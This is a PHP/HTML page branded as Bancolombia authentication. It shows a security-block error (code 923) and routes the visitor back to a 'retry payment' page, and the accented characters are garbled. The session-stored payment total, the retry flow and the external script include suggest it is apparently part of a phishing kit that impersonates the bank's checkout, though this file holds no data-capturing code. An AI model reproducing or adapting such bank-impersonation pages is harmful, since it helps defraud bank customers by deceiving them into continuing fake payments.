<?php
session_start();

/* ===========================
   RECUPERAR TOTAL
=========================== */
$total = $_SESSION['total_pago'] ?? 0;
$precioFormateado = '';

if ($total > 0) {
    $precioFormateado = '$' . number_format((int)$total, 0, ',', '.') . ' COP';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>AutenticaciÃ³n Bancolombia</title>
  <link rel="stylesheet" href="css/923.css">
  <link rel="icon" href="images/favicon.ico">
    <!-- Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <!-- jQuery -->
    <script src="../../scripts/functions.js"></script>
</head>
<body class="fondo">
  <header>
    <img src="images/trico.svg" alt="Bancolombia Logo" class="logo">
<a href="javascript:void(0)" class="logout" onclick="window.location.href='reintentar_pago.php'">
  Salir
  <img src="images/flecha.svg" alt="Flecha" class="icono-flecha">
</a>

  </header>
  <main>
  <div class="alerta-container">
    
        <div class="icon-circle">
        <svg viewBox="0 0 56 56" xmlns="http://www.w3.org/2000/svg">
          <circle cx="28" cy="28" r="28" fill="#FF7E00"/>
          <line x1="17" y1="17" x2="39" y2="39"
                stroke="#2b2b2b" stroke-width="2" stroke-linecap="round"/>
          <line x1="39" y1="17" x2="17" y2="39"
                stroke="#2b2b2b" stroke-width="2" stroke-linecap="round"/>
        </svg>
      </div>

  
    <div class="alerta-titulo">Por seguridad, no puedes continuar la transacciÃ³n</div>
    <div class="alerta-texto">
      CÃ³digo: 923 Para confirmar si eres tÃº quiÃ©n hace la transacciÃ³n, te escribiremos desde nuestro WhatsApp oficial 301 353 6788, responde SÃ­ o No. <br>
      Si tienes dudas, llÃ¡manos a la Sucursal TelefÃ³nica y elige la opciÃ³n 3 y de nuevo 3.

  <button class="regreso-boton" onclick="window.location.href='/reintentar.php'">
    Reintentar Pago
  </button>
</div>
      
  </main>
  <div class="lineafinal1">
    <div class="lineafinal2"></div>
  
    <span class="lineafinal3">
      <div class="lineafinal4">
        <div class="lineafinal5"></div>
        <div class="lineafinal6"></div>
      </div>
  
      <div class="lineafinal7">
      </div>
    </span>
  </div>

</body>
</html>
